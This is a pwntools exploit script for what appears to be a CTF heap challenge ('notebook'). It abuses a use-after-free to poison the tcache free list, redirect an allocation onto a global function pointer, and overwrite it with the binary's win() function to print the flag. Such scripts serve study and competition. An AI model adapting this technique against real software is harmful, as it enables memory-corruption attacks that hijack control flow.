#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./notebook', checksec=False)


def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13505)
    return process(elf.path)

p = conn()

NOTE_SIZE = 0x60

def create(idx, data=b'A' * NOTE_SIZE):
    p.sendlineafter(b'> ',      b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ',      data[:NOTE_SIZE].ljust(NOTE_SIZE, b'\x00'))

def free_item(idx):
    p.sendlineafter(b'> ',      b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ',      b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ',      data[:NOTE_SIZE].ljust(NOTE_SIZE, b'\x00'))

def trigger():
    p.sendlineafter(b'> ',      b'5')

WIN            = elf.sym.win
GLOBAL_HANDLER = elf.sym.global_handler
TARGET         = GLOBAL_HANDLER & ~0xf       # 0x4040c0 — already aligned, no change
OFFSET         = GLOBAL_HANDLER - TARGET     # 0

create(0)                                    # chunk A
create(1)                                    # chunk B

free_item(0)                                 # tcache[0x70]: count=1, head=A
free_item(1)                                 # tcache[0x70]: count=2, head=B, B->fd=A

# UAF: poison B->fd (the HEAD) → &global_handler
edit(1, p64(TARGET) + b'\x00' * (NOTE_SIZE - 8))

create(2)                                    # pops B: count=1, head=0x4040c0
create(3, b'\x00' * OFFSET + p64(WIN) + b'\x00' * (NOTE_SIZE - OFFSET - 8))
                                             # pops 0x4040c0: writes WIN to global_handler

trigger()                                    # global_handler("hello") → win() → flag

print(p.recvall(timeout=2).decode(errors='replace'))